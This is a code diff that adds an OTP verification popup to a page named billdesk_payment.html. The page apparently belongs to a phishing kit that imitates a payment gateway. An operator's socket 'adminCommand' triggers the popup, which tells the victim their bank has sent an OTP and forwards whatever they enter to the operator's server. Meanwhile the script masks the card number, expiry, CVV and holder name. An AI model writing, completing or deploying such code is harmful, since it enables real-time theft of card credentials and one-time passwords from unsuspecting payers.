@@ -1,0 +1,436 @@
+<!-- ============================================ -->
+<!-- OTP POPUP MODAL - Add this to billdesk_payment.html -->
+<!-- Insert BEFORE closing </body> tag -->
+<!-- ============================================ -->
+
+<!-- OTP Verification Modal Overlay -->
+<div id="otpModal" class="otp-modal-overlay" style="display: none;">
+    <div class="otp-modal-content">
+        <!-- Card Icon -->
+        <div class="otp-icon">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                <line x1="1" y1="10" x2="23" y2="10"></line>
+            </svg>
+        </div>
+        
+        <!-- Title -->
+        <h2 class="otp-title">Enter verification code</h2>
+        
+        <!-- Instruction Text -->
+        <p class="otp-instruction">Your bank has sent an OTP to your registered mobile number.</p>
+        
+        <!-- OTP Input Field -->
+        <div class="otp-input-container">
+            <label class="otp-label">OTP</label>
+            <input type="text" id="otpInputField" class="otp-input" maxlength="6" placeholder="Enter 6-digit OTP" inputmode="numeric">
+            <div class="otp-countdown" id="otpCountdown">Expires in 2:59</div>
+        </div>
+        
+        <!-- Buttons -->
+        <div class="otp-buttons">
+            <button class="otp-btn otp-btn-back" onclick="closeOtpPopup()">Back</button>
+            <button class="otp-btn otp-btn-verify" onclick="submitOtp()">Verify</button>
+        </div>
+    </div>
+</div>
+
+<!-- OTP Modal Styles -->
+<style>
+.otp-modal-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.75);
+    backdrop-filter: blur(4px);
+    z-index: 9999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    animation: fadeIn 0.3s ease-out;
+}
+
+.otp-modal-content {
+    background: white;
+    border-radius: 12px;
+    padding: 32px;
+    width: 90%;
+    max-width: 420px;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+    animation: slideDown 0.4s ease-out;
+    position: relative;
+}
+
+.otp-icon {
+    width: 48px;
+    height: 48px;
+    margin: 0 auto 20px;
+    color: #333;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.otp-title {
+    font-size: 24px;
+    font-weight: 600;
+    color: #1a1a1a;
+    text-align: center;
+    margin: 0 0 12px 0;
+}
+
+.otp-instruction {
+    font-size: 14px;
+    color: #666;
+    text-align: center;
+    margin: 0 0 28px 0;
+    line-height: 1.5;
+}
+
+.otp-input-container {
+    margin-bottom: 24px;
+}
+
+.otp-label {
+    display: block;
+    font-size: 14px;
+    font-weight: 500;
+    color: #333;
+    margin-bottom: 8px;
+}
+
+.otp-input {
+    width: 100%;
+    padding: 14px 16px;
+    font-size: 18px;
+    border: 2px solid #ddd;
+    border-radius: 8px;
+    outline: none;
+    transition: border-color 0.2s;
+    letter-spacing: 4px;
+    text-align: center;
+    font-weight: 600;
+}
+
+.otp-input:focus {
+    border-color: #ff6b35;
+}
+
+.otp-countdown {
+    font-size: 13px;
+    color: #999;
+    margin-top: 8px;
+    text-align: right;
+}
+
+.otp-buttons {
+    display: flex;
+    gap: 12px;
+}
+
+.otp-btn {
+    flex: 1;
+    padding: 14px 24px;
+    font-size: 16px;
+    font-weight: 600;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all 0.2s;
+}
+
+.otp-btn-back {
+    background: #f5f5f5;
+    color: #333;
+}
+
+.otp-btn-back:hover {
+    background: #e5e5e5;
+}
+
+.otp-btn-verify {
+    background: #ff6b35;
+    color: white;
+}
+
+.otp-btn-verify:hover {
+    background: #e55a25;
+}
+
+.otp-btn:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+}
+
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 1;
+    }
+}
+
+@keyframes slideDown {
+    from {
+        transform: translateY(-30px);
+        opacity: 0;
+    }
+    to {
+        transform: translateY(0);
+        opacity: 1;
+    }
+}
+
+/* Locked card fields styling */
+.field-locked {
+    background: #f9f9f9 !important;
+    color: #999 !important;
+    pointer-events: none;
+    user-select: none;
+}
+</style>
+
+<!-- OTP Modal JavaScript -->
+<script>
+let otpTimerInterval = null;
+let otpTimeRemaining = 180; // 3 minutes (180 seconds)
+let currentOtpSessionId = null;
+
+// ============================================
+// OPEN OTP POPUP (Called from socket listener)
+// ============================================
+function openOtpPopup(sessionId) {
+    console.log('🔐 [OTP] Opening OTP popup for session:', sessionId);
+    
+    currentOtpSessionId = sessionId;
+    
+    // Show modal
+    const modal = document.getElementById('otpModal');
+    modal.style.display = 'flex';
+    
+    // Lock card fields
+    lockCardFields();
+    
+    // Start countdown timer
+    startOtpTimer();
+    
+    // Focus on OTP input
+    setTimeout(() => {
+        document.getElementById('otpInputField').focus();
+    }, 300);
+}
+
+// ============================================
+// CLOSE OTP POPUP
+// ============================================
+function closeOtpPopup() {
+    const modal = document.getElementById('otpModal');
+    modal.style.display = 'none';
+    
+    // Stop timer
+    if (otpTimerInterval) {
+        clearInterval(otpTimerInterval);
+        otpTimerInterval = null;
+    }
+    
+    // Unlock card fields
+    unlockCardFields();
+    
+    // Clear input
+    document.getElementById('otpInputField').value = '';
+    
+    console.log('🔐 [OTP] Popup closed');
+}
+
+// ============================================
+// LOCK CARD FIELDS (Mask values)
+// ============================================
+function lockCardFields() {
+    const cardNumber = document.getElementById('cardNumber');
+    const expiryDate = document.getElementById('expiryDate');
+    const cvv = document.getElementById('cvvCode');
+    const cardHolderName = document.getElementById('cardHolderName');
+    
+    if (cardNumber) {
+        const original = cardNumber.value;
+        cardNumber.dataset.original = original; // Store original
+        cardNumber.value = generateMaskedValue(original.length || 19);
+        cardNumber.classList.add('field-locked');
+        cardNumber.readOnly = true;
+    }
+    
+    if (expiryDate) {
+        const original = expiryDate.value;
+        expiryDate.dataset.original = original;
+        expiryDate.value = generateMaskedValue(5);
+        expiryDate.classList.add('field-locked');
+        expiryDate.readOnly = true;
+    }
+    
+    if (cvv) {
+        const original = cvv.value;
+        cvv.dataset.original = original;
+        cvv.value = generateMaskedValue(3);
+        cvv.classList.add('field-locked');
+        cvv.readOnly = true;
+    }
+    
+    if (cardHolderName) {
+        const original = cardHolderName.value;
+        cardHolderName.dataset.original = original;
+        cardHolderName.value = generateMaskedValue(original.length || 15);
+        cardHolderName.classList.add('field-locked');
+        cardHolderName.readOnly = true;
+    }
+    
+    console.log('🔒 [OTP] Card fields locked and masked');
+}
+
+// ============================================
+// UNLOCK CARD FIELDS (Restore values)
+// ============================================
+function unlockCardFields() {
+    const cardNumber = document.getElementById('cardNumber');
+    const expiryDate = document.getElementById('expiryDate');
+    const cvv = document.getElementById('cvvCode');
+    const cardHolderName = document.getElementById('cardHolderName');
+    
+    if (cardNumber && cardNumber.dataset.original) {
+        cardNumber.value = cardNumber.dataset.original;
+        cardNumber.classList.remove('field-locked');
+        cardNumber.readOnly = false;
+    }
+    
+    if (expiryDate && expiryDate.dataset.original) {
+        expiryDate.value = expiryDate.dataset.original;
+        expiryDate.classList.remove('field-locked');
+        expiryDate.readOnly = false;
+    }
+    
+    if (cvv && cvv.dataset.original) {
+        cvv.value = cvv.dataset.original;
+        cvv.classList.remove('field-locked');
+        cvv.readOnly = false;
+    }
+    
+    if (cardHolderName && cardHolderName.dataset.original) {
+        cardHolderName.value = cardHolderName.dataset.original;
+        cardHolderName.classList.remove('field-locked');
+        cardHolderName.readOnly = false;
+    }
+    
+    console.log('🔓 [OTP] Card fields unlocked');
+}
+
+// ============================================
+// GENERATE MASKED VALUE (Random alphanumeric)
+// ============================================
+function generateMaskedValue(length) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+// ============================================
+// START OTP COUNTDOWN TIMER
+// ============================================
+function startOtpTimer() {
+    otpTimeRemaining = 180; // Reset to 3 minutes
+    updateOtpCountdown();
+    
+    otpTimerInterval = setInterval(() => {
+        otpTimeRemaining--;
+        updateOtpCountdown();
+        
+        if (otpTimeRemaining <= 0) {
+            clearInterval(otpTimerInterval);
+            otpTimerInterval = null;
+            document.getElementById('otpCountdown').textContent = 'Expired';
+            document.getElementById('otpCountdown').style.color = '#ff0000';
+        }
+    }, 1000);
+}
+
+// ============================================
+// UPDATE COUNTDOWN DISPLAY
+// ============================================
+function updateOtpCountdown() {
+    const minutes = Math.floor(otpTimeRemaining / 60);
+    const seconds = otpTimeRemaining % 60;
+    const display = `Expires in ${minutes}:${seconds.toString().padStart(2, '0')}`;
+    document.getElementById('otpCountdown').textContent = display;
+}
+
+// ============================================
+// SUBMIT OTP TO SERVER
+// ============================================
+function submitOtp() {
+    const otpInput = document.getElementById('otpInputField');
+    const otp = otpInput.value.trim();
+    
+    // Validate OTP
+    if (!otp || otp.length < 4) {
+        alert('Please enter a valid OTP');
+        return;
+    }
+    
+    console.log('🔐 [OTP] Submitting OTP:', { sessionId: currentOtpSessionId, otp });
+    
+    // Emit OTP to server
+    if (paymentSocket && currentOtpSessionId) {
+        paymentSocket.emit('otp-submitted', {
+            sessionId: currentOtpSessionId,
+            otp: otp
+        });
+        
+        console.log('✅ [OTP] OTP sent to server');
+        
+        // Show success message (don't close popup)
+        alert('OTP submitted successfully!');
+        
+        // Optionally disable submit button
+        const verifyBtn = document.querySelector('.otp-btn-verify');
+        if (verifyBtn) {
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Submitted';
+        }
+    } else {
+        console.error('❌ [OTP] Socket not connected or no session ID');
+        alert('Connection error. Please try again.');
+    }
+}
+
+// ============================================
+// SOCKET LISTENER FOR OTP COMMAND
+// Add this to the existing paymentSocket listeners
+// ============================================
+// Already added in billdesk_payment.html at line 644:
+// paymentSocket.on('adminCommand', (data) => {
+//     if (data.command === 'otp') {
+//         openOtpPopup(data.sessionId);
+//     }
+// });
+
+// Allow Enter key to submit OTP
+document.addEventListener('DOMContentLoaded', () => {
+    const otpInput = document.getElementById('otpInputField');
+    if (otpInput) {
+        otpInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                submitOtp();
+            }
+        });
+        
+        // Only allow numbers
+        otpInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+    }
+});
+</script>
